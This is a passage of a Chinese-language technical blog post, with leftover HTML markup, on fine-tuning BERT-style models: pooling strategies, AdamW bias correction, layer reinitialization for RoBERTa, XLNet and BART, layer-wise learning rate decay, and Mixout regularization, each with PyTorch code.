class="hljs-keyword">in</span> range(sent_len):<br>            token_feature = sentence_feature[:, token_index, :]<br>            sim_map = self.cosine_similarity_torch(token_feature)<br>            var_token[token_index] = torch.var(sim_map.diagonal(<span class="hljs-number">-1</span>))<br><br>        var_token = var_token / torch.sum(var_token)<br>        sentence_embedding = torch.mv(one_sentence_embedding.t(), var_token)<br><br>        <span class="hljs-keyword">return</span> sentence_embedding<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cosine_similarity_torch</span><span class="hljs-params">(self, x1, x2=None, eps=<span class="hljs-number">1e-8</span>)</span>:</span><br>        x2 = x1 <span class="hljs-keyword">if</span> x2 <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> x2<br>        w1 = x1.norm(p=<span class="hljs-number">2</span>, dim=<span class="hljs-number">1</span>, keepdim=<span class="hljs-literal">True</span>)<br>        w2 = w1 <span class="hljs-keyword">if</span> x2 <span class="hljs-keyword">is</span> x1 <span class="hljs-keyword">else</span> x2.norm(p=<span class="hljs-number">2</span>, dim=<span class="hljs-number">1</span>, keepdim=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">return</span> torch.mm(x1, x2.t()) / (w1 * w2.t()).clamp(min=eps)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pooler = WKPooling(layer_start=<span class="hljs-number">9</span>)<br>wkpooling_embeddings = pooler(all_hidden_states)<br>logits = nn.Linear(config.hidden_size, <span class="hljs-number">1</span>)(wkpooling_embeddings) <span class="hljs-comment"># regression head</span><br></code></pre></div></td></tr></table></figure><h3><span id="other-methods">Other methods</span></h3><ul><li>Dense Pooling</li><li>Word Weight (TF-IDF) Pooling</li><li>Async Pooling</li><li>Parallel / Heirarchical Aggregation</li></ul><p>每个任务上，不同的方法表现有差异，应该根据情况选择使用不同的方法。</p><h2><span id="few-shot-stability">Few-Shot Stability</span></h2><p>Fine-tuning Transformer models通常不稳定，收到超参数的影响大，不同的random seed 也会导致不同的结果。</p><p>比如，在训练时，每个epoch中多进行evaluating，而不是在每个epoch之后evaluating，能够增加stability。</p><p>其他方法有：</p><ul><li>Debiasing Omission In BertADAM</li><li>Re-Initializing Transformer Layers</li><li>Utilizing Intermediate Layers</li><li>Layer-wise Learning Rate Decay (LLRD)</li><li>Mixout Regularization</li><li>Pre-trained Weight Decay</li><li>Stochastic Weight Averaging</li></ul><p>通常不会一起用，可能会互向影响。方法各自提出的环境也不同。所以一般一两种方法的使用，能够提高模型性能。</p><h3><span id="debiasing-omission-inbertadam">Debiasing Omission InBERTAdam</span></h3><figure class="highlight lisp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lisp">rescaled_grad = clip(<span class="hljs-name">grad</span> * rescale_grad, clip_gradient)<br>m = beta1 * m + (<span class="hljs-number">1</span> - beta1) * rescaled_grad<br>v = beta2 * v + (<span class="hljs-number">1</span> - beta2) * (rescaled_grad**2)<br>w = w - learning_rate * (<span class="hljs-name">m</span> / (<span class="hljs-name">sqrt</span>(<span class="hljs-name">v</span>) + epsilon) + wd * w)<br></code></pre></div></td></tr></table></figure><p>和标准Adam，差别在于 wd * w，增加了 weight decay。论文 <a href="https://openreview.net/forum?id=rk6qdGgCZ"><em>Fixing Weight DecayRegularization in Adam</em></a> 中提出的 AdamW，保留了 bias-correctionterms （上面伪代码第2，3行），并且将 wd * w 加入 learning_rate的影响。将下图中的紫色 weight decay 方法，改为绿色的部分。这样更新 x时，weight decay 不会耦合参数 <span class="math inline">\(\beta\)</span>和 <span class="math inline">\(w_t\)</span>（第7、8行），而是直接作用于x（第12行）。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Practical BERT_pic/image-20210722113017435.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>Debiasing Omission就是要保留 bias-correction terms。在<em>HuggingFace Transformers AdamW</em>中设置<em><code>correct_bias</code> parameter 为 True （default）</em>。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">lr = <span class="hljs-number">2e-5</span><br>epsilon = <span class="hljs-number">1e-6</span><br>weight_decay = <span class="hljs-number">0.01</span><br><br>no_decay = [<span class="hljs-string">"bias"</span>, <span class="hljs-string">"LayerNorm.weight"</span>]<br>optimizer_grouped_parameters = [&#123;<br>    <span class="hljs-string">"params"</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.named_parameters() <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay)],<br>    <span class="hljs-string">"weight_decay"</span>: weight_decay,<br>    <span class="hljs-string">"lr"</span>: lr&#125;,<br>    &#123;<span class="hljs-string">"params"</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.named_parameters() <span class="hljs-keyword">if</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay)],<br>    <span class="hljs-string">"weight_decay"</span>: <span class="hljs-number">0.0</span>,<br>    <span class="hljs-string">"lr"</span>: lr&#125;<br>]<br><br>optimizer = AdamW(<br>    optimizer_grouped_parameters,<br>    lr=lr,<br>    eps=epsilon,<br>    correct_bias=<span class="hljs-literal">True</span><br>)<br></code></pre></div></td></tr></table></figure><h3><span id="reinitializing-transformerlayers">Reinitializing TransformerLayers</span></h3><p>来自计算机视觉的直觉，高层与预训练任务相关的层，可以重新训练。</p><p>比如，Reinitialize Pooler layer的参数</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">add_pooler = <span class="hljs-literal">True</span><br>reinit_pooler = <span class="hljs-literal">True</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Net</span><span class="hljs-params">(nn.Module)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, config, _pretrained_model, add_pooler)</span>:</span><br>        super(Net, self).__init__()<br>        self.roberta = RobertaModel.from_pretrained(_pretrained_model, add_pooling_layer=add_pooler)<br>        self.classifier = RobertaClassificationHead(config)<br>        <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, input_ids, attention_mask)</span>:</span><br>        outputs = self.roberta(input_ids, attention_mask=attention_mask,)<br>        sequence_output = outputs[<span class="hljs-number">0</span>]<br>        logits = self.classifier(sequence_output)<br>        <span class="hljs-keyword">return</span> logits<br>        <br>model = Net(config, _pretrained_model, add_pooler)<br><br><span class="hljs-keyword">if</span> reinit_pooler:<br>    print(<span class="hljs-string">'Reinitializing Pooler Layer ...'</span>)<br>    encoder_temp = getattr(model, _model_type)<br>    encoder_temp.pooler.dense.weight.data.normal_(mean=<span class="hljs-number">0.0</span>, std=encoder_temp.config.initializer_range)<br>    encoder_temp.pooler.dense.bias.data.zero_()<br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> encoder_temp.pooler.parameters():<br>        p.requires_grad = <span class="hljs-literal">True</span><br>    print(<span class="hljs-string">'Done.!'</span>)<br></code></pre></div></td></tr></table></figure><p>对 RoBERTa 的transformer layer进行 Reinitialize 。</p><blockquote><p>RoBERTa 不同于 BERT 在于：</p><ul><li>没有 next-sentence pretraining objective ，更改了超参，更大的 batchsize 和learning rate</li><li>使用 byte level BPE 的 tokenizer</li><li>没有 token_type_ids，只需要 用 sep_token 分开不同 sentence。</li></ul></blockquote><p>检查是否被初始化：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> model.roberta.encoder.layer[-reinit_layers:]:<br>    <span class="hljs-keyword">for</span> module <span class="hljs-keyword">in</span> layer.modules():<br>        <span class="hljs-keyword">if</span> isinstance(module, nn.Linear):<br>            print(module.weight.data)<br></code></pre></div></td></tr></table></figure><p>重新初始化</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">reinit_layers = <span class="hljs-number">2</span><br><span class="hljs-comment"># TF version uses truncated_normal for initialization. This is Pytorch</span><br><span class="hljs-keyword">if</span> reinit_layers &gt; <span class="hljs-number">0</span>:<br>    print(<span class="hljs-string">f'Reinitializing Last <span class="hljs-subst">&#123;reinit_layers&#125;</span> Layers ...'</span>)<br>    encoder_temp = getattr(model, _model_type)<br>    <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> encoder_temp.encoder.layer[-reinit_layers:]:<br>        <span class="hljs-keyword">for</span> module <span class="hljs-keyword">in</span> layer.modules():<br>            <span class="hljs-keyword">if</span> isinstance(module, nn.Linear):<br>                module.weight.data.normal_(mean=<span class="hljs-number">0.0</span>, std=config.initializer_range)<br>                <span class="hljs-keyword">if</span> module.bias <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    module.bias.data.zero_()<br>            <span class="hljs-keyword">elif</span> isinstance(module, nn.Embedding):<br>                module.weight.data.normal_(mean=<span class="hljs-number">0.0</span>, std=config.initializer_range)<br>                <span class="hljs-keyword">if</span> module.padding_idx <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    module.weight.data[module.padding_idx].zero_()<br>            <span class="hljs-keyword">elif</span> isinstance(module, nn.LayerNorm):<br>                module.bias.data.zero_()<br>                module.weight.data.fill_(<span class="hljs-number">1.0</span>)<br>    print(<span class="hljs-string">'Done.!'</span>)<br></code></pre></div></td></tr></table></figure><p>另外 XLNet 实现方式有些不同 （Transformer-XL）：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">reinit_layers = <span class="hljs-number">2</span><br><br><span class="hljs-keyword">if</span> reinit_layers &gt; <span class="hljs-number">0</span>:<br>    print(<span class="hljs-string">f'Reinitializing Last <span class="hljs-subst">&#123;reinit_layers&#125;</span> Layers ...'</span>)<br>    <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> model.transformer.layer[-reinit_layers :]:<br>        <span class="hljs-keyword">for</span> module <span class="hljs-keyword">in</span> layer.modules():<br>            <span class="hljs-keyword">if</span> isinstance(module, (nn.Linear, nn.Embedding)):<br>                module.weight.data.normal_(mean=<span class="hljs-number">0.0</span>, std=model.transformer.config.initializer_range)<br>                <span class="hljs-keyword">if</span> isinstance(module, nn.Linear) <span class="hljs-keyword">and</span> module.bias <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    module.bias.data.zero_()<br>            <span class="hljs-keyword">elif</span> isinstance(module, nn.LayerNorm):<br>                module.bias.data.zero_()<br>                module.weight.data.fill_(<span class="hljs-number">1.0</span>)<br>            <span class="hljs-keyword">elif</span> isinstance(module, XLNetRelativeAttention):<br>                <span class="hljs-keyword">for</span> param <span class="hljs-keyword">in</span> [<br>                    module.q,<br>                    module.k,<br>                    module.v,<br>                    module.o,<br>                    module.r,<br>                    module.r_r_bias,<br>                    module.r_s_bias,<br>                    module.r_w_bias,<br>                    module.seg_embed,<br>                ]:<br>                    param.data.normal_(mean=<span class="hljs-number">0.0</span>, std=model.transformer.config.initializer_range)<br>    print(<span class="hljs-string">'Done.!'</span>)<br></code></pre></div></td></tr></table></figure><p>BART，是seq2seq的结构，"BERT"作为encoder，"GPT"作为decoder（left-to-right）。采用了多样的噪声预训练方式。</p><ul><li>随机token masking</li><li>随机token deletion</li><li>随机连续tokens替换为一个mask，或者直接插入一个mask</li><li>随机打乱文本sentence顺序</li><li>将文本序列连成环，随机选择文本开始位置</li></ul><p>BART文本理解任务效果可以持平RoBERTa，且适合文本生成任务，而模型大小仅仅比BERT大10%。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">reinit_layers = <span class="hljs-number">2</span><br>_model_type = <span class="hljs-string">'bart'</span><br>_pretrained_model = <span class="hljs-string">'facebook/bart-base'</span><br>config = AutoConfig.from_pretrained(_pretrained_model)<br>config.update(&#123;<span class="hljs-string">'num_labels'</span>:<span class="hljs-number">1</span>&#125;)<br>model = AutoModelForSequenceClassification.from_pretrained(_pretrained_model)<br><br><span class="hljs-keyword">if</span> reinit_layers &gt; <span class="hljs-number">0</span>:<br>    print(<span class="hljs-string">f'Reinitializing Last <span class="hljs-subst">&#123;reinit_layers&#125;</span> Layers ...'</span>)<br>    <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> model.model.decoder.layers[-reinit_layers :]:<br>        <span class="hljs-keyword">for</span> module <span class="hljs-keyword">in</span> layer.modules():<br>            model.model._init_weights(module)<br>    print(<span class="hljs-string">'Done.!'</span>)<br></code></pre></div></td></tr></table></figure><p>实验表明， Re-initialization 对 random seed 更robust。不建议初始化超过6层的layer，不同任务需要实验找到最好的参数。</p><h3><span id="utilizing-intermediatelayers">Utilizing IntermediateLayers</span></h3><p>此部分就是本文第一节 Transformer Representations 的内容。</p><h3><span id="llrd-layerwise-learningrate-decay">LLRD - Layerwise LearningRate Decay</span></h3><p>就是 low layer 通用信息，低学习率，top layer任务相关信息，相对较高学习率。</p><p>一种方法是，每层有一个 decay rate</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_optimizer_grouped_parameters</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">    model, model_type, </span></span><br><span class="hljs-function"><span class="hljs-params">    learning_rate, weight_decay, </span></span><br><span class="hljs-function"><span class="hljs-params">    layerwise_learning_rate_decay</span></span><br><span class="hljs-function"><span class="hljs-params">)</span>:</span><br>    no_decay = [<span class="hljs-string">"bias"</span>, <span class="hljs-string">"LayerNorm.weight"</span>]<br>    <br>    <span class="hljs-comment"># initialize lr for task specific layer</span><br>    optimizer_grouped_parameters = [<br>        &#123;<br>            <span class="hljs-string">"params"</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.named_parameters() <span class="hljs-keyword">if</span> <span class="hljs-string">"classifier"</span> <span class="hljs-keyword">in</span> n <span class="hljs-keyword">or</span> <span class="hljs-string">"pooler"</span> <span class="hljs-keyword">in</span> n],<br>            <span class="hljs-string">"weight_decay"</span>: <span class="hljs-number">0.0</span>,<br>            <span class="hljs-string">"lr"</span>: learning_rate,<br>        &#125;,<br>    ]<br>    <br>    <span class="hljs-comment"># initialize lrs for every layer</span><br>    num_layers = model.config.num_hidden_layers<br>    layers = [getattr(model, model_type).embeddings] + list(getattr(model, model_type).encoder.layer)<br>    layers.reverse()<br>    <br>    lr = learning_rate<br>    <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> layers:<br>        lr *= layerwise_learning_rate_decay<br>        optimizer_grouped_parameters += [<br>            &#123;<br>                <span class="hljs-string">"params"</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> layer.named_parameters() <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay)],<br>                <span class="hljs-string">"weight_decay"</span>: weight_decay,<br>                <span class="hljs-string">"lr"</span>: lr,<br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">"params"</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> layer.named_parameters() <span class="hljs-keyword">if</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay)],<br>                <span class="hljs-string">"weight_decay"</span>: <span class="hljs-number">0.0</span>,<br>                <span class="hljs-string">"lr"</span>: lr,<br>            &#125;,<br>        ]<br>    <span class="hljs-keyword">return</span> optimizer_grouped_parameters<br></code></pre></div></td></tr></table></figure><p>其他方法 见 第三节 Training Strategies 的 Differential /Discriminative Learning Rate 部分。</p><h3><span id="mixout-regularization">Mixout Regularization</span></h3><p>不同于 Dropout 将神经元以概率p丢弃，Mixout 是将神经元参数以概率 p替换为预训练模型的参数。意思就是有两组参数，一组来自预训练好的模型，另一组为当前训练的参数。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Practical BERT_pic/image-20210722125928033.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p>如图，替换为红色模型的参数。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># https://github.com/bloodwass/mixout</span><br><br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> torch.nn.init <span class="hljs-keyword">as</span> init<br><span class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F<br><span class="hljs-keyword">from</span> torch.nn <span class="hljs-keyword">import</span> Parameter<br><span class="hljs-keyword">from</span> torch.autograd.function <span class="hljs-keyword">import</span> InplaceFunction<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mixout</span><span class="hljs-params">(InplaceFunction)</span>:</span><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_make_noise</span><span class="hljs-params">(input)</span>:</span><br>        <span class="hljs-keyword">return</span> input.new().resize_as_(input)<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(cls, ctx, input, target=None, p=<span class="hljs-number">0.0</span>, training=False, inplace=False)</span>:</span><br>        <span class="hljs-keyword">if</span> p &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> p &gt; <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"A mix probability of mixout has to be between 0 and 1,"</span> <span class="hljs-string">" but got &#123;&#125;"</span>.format(p))<br>        <span class="hljs-keyword">if</span> target <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> input.size() != target.size():<br>            <span class="hljs-keyword">raise</span> ValueError(<br>                <span class="hljs-string">"A target tensor size must match with a input tensor size &#123;&#125;,"</span><br>                <span class="hljs-string">" but got &#123;&#125;"</span>.format(input.size(), target.size())<br>            )<br>        ctx.p = p<br>        ctx.training = training<br><br>        <span class="hljs-keyword">if</span> ctx.p == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> ctx.training:<br>            <span class="hljs-keyword">return</span> input<br><br>        <span class="hljs-keyword">if</span> target <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            target = cls._make_noise(input)<br>            target.fill_(<span class="hljs-number">0</span>)<br>        target = target.to(input.device)<br><br>        <span class="hljs-keyword">if</span> inplace:<br>            ctx.mark_dirty(input)<br>            output = input<br>        <span class="hljs-keyword">else</span>:<br>            output = input.clone()<br><br>        ctx.noise = cls._make_noise(input)<br>        <span class="hljs-keyword">if</span> len(ctx.noise.size()) == <span class="hljs-number">1</span>:<br>            ctx.noise.bernoulli_(<span class="hljs-number">1</span> - ctx.p)<br>        <span class="hljs-keyword">else</span>:<br>            ctx.noise[<span class="hljs-number">0</span>].bernoulli_(<span class="hljs-number">1</span> - ctx.p)<br>            ctx.noise = ctx.noise[<span class="hljs-number">0</span>].repeat(input.size()[<span class="hljs-number">0</span>], <span class="hljs-number">1</span>)<br>        ctx.noise.expand_as(input)<br><br>        <span class="hljs-keyword">if</span> ctx.p == <span class="hljs-number">1</span>:<br>            output = target<br>        <span class="hljs-keyword">else</span>:<br>            output = ((<span class="hljs-number">1</span> - ctx.noise) * target + ctx.noise * output - ctx.p * target) / (<span class="hljs-number">1</span> - ctx.p)<br>        <span class="hljs-keyword">return</span> output<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backward</span><span class="hljs-params">(ctx, grad_output)</span>:</span><br>        <span class="hljs-keyword">if</span> ctx.p &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> ctx.training:<br>            <span class="hljs-keyword">return</span> grad_output * ctx.noise, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> grad_output, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mixout</span><span class="hljs-params">(input, target=None, p=<span class="hljs-number">0.0</span>, training=False, inplace=False)</span>:</span><br>    <span class="hljs-keyword">return</span> Mixout.apply(input, target, p, training, inplace)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MixLinear</span><span class="hljs-params">(torch.nn.Module)</span>:</span><br>    __constants__ = [<span class="hljs-string">"bias"</span>, <span class="hljs-string">"in_features"</span>, <span class="hljs-string">"out_features"</span>]  <span class="hljs-comment"># for jit optimization</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, in_features, out_features, bias=True, target=None, p=<span class="hljs-number">0.0</span>)</span>:</span><br>        super(MixLinear, self).__init__()<br>        self.in_features = in_features<br>        self.out_features = out_features<br>        self.weight = Parameter(torch.Tensor(out_features, in_features))<br>        <span class="hljs-keyword">if</span> bias:<br>            self.bias = Parameter(torch.Tensor(out_features))<br>        <span class="hljs-keyword">else</span>:<br>            self.register_parameter(<span class="hljs-string">"bias"</span>, <span class="hljs-literal">None</span>)<br>        self.reset_parameters()<br>        self.target = target<br>        self.p = p<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reset_parameters</span><span class="hljs-params">(self)</span>:</span><br>        init.kaiming_uniform_(self.weight, a=math.sqrt(<span class="hljs-number">5</span>))<br>        <span class="hljs-keyword">if</span> self.bias <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            fan_in, _ = init._calculate_fan_in_and_fan_out(self.weight)<br>            bound = <span class="hljs-number">1</span> / math.sqrt(fan_in)<br>            init.uniform_(self.bias, -bound, bound)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, input)</span>:</span><br>        <span class="hljs-keyword">return</span> F.linear(input, mixout(self.weight, self.target, self.p, self.training), self.bias)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extra_repr</span><span class="hljs-params">(self)</span>:</span><br>        type = <span class="hljs-string">"drop"</span> <span class="hljs-keyword">if</span> self.target <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"mix"</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"&#123;&#125;=&#123;&#125;, in_features=&#123;&#125;, out_features=&#123;&#125;, bias=&#123;&#125;"</span>.format(<br>            type + <span class="hljs-string">"out"</span>, self.p, self.in_features, self.out_features, self.bias <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>        )<br></code></pre></div></td></tr></table></figure><p>使用：</p><figure class="highlight python"><table><tr><td class="gutter 